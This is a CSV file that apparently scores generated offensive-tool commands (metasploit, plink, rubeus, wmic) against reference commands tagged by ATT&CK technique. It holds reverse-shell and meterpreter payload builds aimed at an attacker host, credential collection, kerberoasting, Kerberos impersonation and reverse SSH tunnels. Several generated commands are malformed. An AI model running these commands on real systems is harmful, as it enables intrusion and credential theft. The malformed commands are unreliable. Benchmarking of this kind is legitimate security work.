file,tool,input_command,matched_command,edit_score,match_found
command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,0.485,True
command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,0.351,True
command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```",0.37,True
command_metasploit_TA0011_T1219.txt,metasploit,set RHOSTS <target_ip>,`msfvenom -p python/meterpreter/reverse_https LHOST=<attacker IP> LPORT=8443 -o python.py`,0.25,True
command_metasploit_TA0011_T1219.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
command_metasploit_TA0011_T1219.txt,metasploit,use post/multi/launcher/cobaltstrike,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.321,True
command_metasploit_TA0011_T1219.txt,metasploit,set SESSION <session_id>,`msf> loot -t screenspy.screenshot`,0.305,True
command_metasploit_TA0011_T1219.txt,metasploit,exploit,`meterpreter > load powershell`,0.211,True
command_plink_TA0008_T1021.txt,plink,plink.exe root@myserver -s /etc/backups/do-backup.sh,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.388,True
command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.595,True
command_plink_TA0008_T1021.txt,plink,plink.exe root@myserver -s /bin/bash,`plink.exe <domain_admin>@<bankfileserver_ip>`,0.463,True
command_plink_TA0008_T1021.txt,plink,plink.exe -A -t attacker_ssh_user@remote_server -X,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",0.49,True
command_rubeus_TA0003_T1547.txt,rubeus,"rubeus.exe createnetonly /program:""C:\Windows\System32\rundll32.exe"" /impersonateuser:<placeholder>",`rubeus.exe kerberoast /domain:oz.local`,0.345,True
command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:<placeholder>,`rubeus.exe kerberoast /domain:oz.local`,0.252,True
command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe logonsession,`rubeus.exe kerberoast /domain:oz.local`,0.413,True
command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,0.508,True
command_rubeus_TA0004_T1547.txt,rubeus,"rubeus.exe createnetonly /program:""C:\Windows\System32\run.exe"" /impersonateuser:<registry_key>",`rubeus.exe kerberoast /domain:oz.local`,0.37,True
command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe logonsession /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,0.318,True
command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe s4u /user:<username> /rc4:<random_key> /impersonateuser:<registry_key>,`rubeus.exe kerberoast /domain:oz.local`,0.331,True
command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,0.469,True
command_wmic_TA0002_T1047.txt,wmic,wmic /RECORD:C:\temp\wmi_record.xml,"`wmic /node:#{""POS system""} process call create #{""executable""}`",0.303,True
command_wmic_TA0002_T1047.txt,wmic,"wmic process call ""winmgmt start"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.344,True
command_wmic_TA0002_T1047.txt,wmic,"wmic netuse create ""C:\temp\script.ps1"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.328,True
command_wmic_TA0002_T1047.txt,wmic,"wmic /RECORD:C:\temp\wmi_record.xml; wmic process call ""winmgmt start""; wmic netuse create ""C:\temp\script.ps1""","`wmic /node:#{""POS system""} process call create #{""executable""}`",0.4,True
